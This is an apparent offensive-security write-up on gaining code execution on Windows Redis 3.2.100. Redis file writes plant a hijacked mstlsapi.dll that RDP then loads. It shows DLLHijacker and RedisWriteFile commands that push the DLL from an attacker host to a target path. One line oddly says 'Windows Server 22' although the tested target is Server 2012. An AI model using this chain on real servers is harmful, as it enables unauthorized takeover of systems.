# Redis on Windows with Outbound Internet Access: An Exploration of Exploitation
## Introduction
Techniques related to DLL hijacking have been around for a long time and are still applicable in maintaining privileges, as well as in the creation of trojans, cheats, and phishing. This article focuses on the exploitation of Redis on Windows through DLL hijacking, a method that, although known by some experts, has not been widely publicized or easily found through online searches.

The primary focus is on the inherent vulnerabilities within Redis on Windows, specifically regarding DLL hijacking. Recently, I encountered a situation involving Redis on Windows and decided to investigate any new methods that might have been published online. In particular, [Hunter's summary](https://xz.aliyun.com/t/7940) on XZ provides an overview of various techniques, including:

- Writing web shells
- Startup mechanisms
- Tampering and hijacking
- MOF (Managed Object Format) attacks
- And more

One issue highlighted in Hunter’s summary is the passive nature of DLL hijacking, which this article aims to address. While some may suggest using the master-slave replication RCE (Remote Code Execution) technique, it is important to note that the critical `MODULE LOAD` function was only supported starting from version 4.0.0, and the latest Windows version available on GitHub is 3.2.100.

## Process
### Target Environment
- **OS:** Windows Server 2012
- **Redis:** 3.2.100
- **Role:** Administrator
- **Ports:** 80, 3389, 6379

### Standard Approach
Initially, I noticed the open port 80, which suggested the possibility of writing a web shell, especially since the server was running IIS. The default publishing directory for IIS is `C:\inetpub\wwwroot`. Using standard operations, I attempted to write an ASP file, but due to the lack of ASP/ASP.NET support in the IIS installation on Windows Server 2012, the ASP shell could not be executed.

### RDP Bypass Attack
For the RDP (port 3389), brute-forcing seemed like the only viable option, except for the potential use of the `CVE-2019-0708` vulnerability (Bluekeep) to crash and restart the host, which is generally discouraged. Previous literature mentioned DLL hijacking, so I set up a similar environment and used `Procmon` to analyze the RDP connection process.

To ensure thorough analysis, I set a broad filter to only show paths ending with `.dll`. During the RDP connection, I observed that `mstlsapi.dll` was not found on the system. This issue was specific to Windows Server 22, as it did not occur on other tested systems (Windows Server 2008, Windows 7, and Windows Server 2003).

### Detailed Analysis
The `mstlsapi.dll` is associated with the encryption certificate used in RDP connections. Although detailed information about this DLL is scarce, it is known to be related to MITM (Man-in-the-Middle) attacks and license authorization.

### Exploitation
There are multiple ways to perform DLL hijacking. I initially tried BDF DLL injection, but due to issues with x64 DLLs, I opted for a more straightforward approach using [DLLHijacker](https://github.com/kiwings/DLLHijacker) by kiwings. This tool generates a project for hijacking the DLL, allowing us to modify the `Shellcode` without disrupting the original functionality.

#### Steps:
1. **Generate the Project:**
   ```sh
   python3 DLLHijacker.py mstlsapi.dll
   ```
   This script forwards all exported functions and creates a Visual Studio 2019 project.

2. **Verify the Project:**
   Use `CFF Explorer` to confirm the forwarded functions. The project can be compiled with the default `Calc shellcode` for testing.

3. **Specify the Original DLL Path:**
   Set the absolute path for the original `mstlsapi.dll`, which will be the target for the file write operation.

4. **Write the File:**
   Use [RedisWriteFile](https://github.com/r35tart/RedisWriteFile) to place the `mstlsapi.dll` in the specified path.
   ```sh
   python3 RedisWriteFile.py --rhost=192.168.56.140 --rport=6379 --lhost=192.168.56.1 --rpath="C:\Users\Public\Downloads" --rfile="mstlsapi.dll" --lfile="/tmp/mstlsapi.dll"
   ```

5. **Verify the File Integrity:**
   Ensure the file is correctly written and matches the expected MD5 hash.
   ```sh
   ❯ md5 /tmp/mstlsapi.dll
   MD5 (/tmp/mstlsapi.dll) = 99cbcb346f7d2473bde579fbbe979981
   PS C:\Users\Public\Downloads> Get-FileHash .\mstlsapi.dll -Algorithm MD5
   Algorithm       Hash
   ---------       ----
   MD5             99CBCB346F7D2473BDE579FBBE979981
   ```

This method allows for the effective exploitation of Redis on Windows through DLL hijacking, providing a robust and reliable way to gain control over the target system.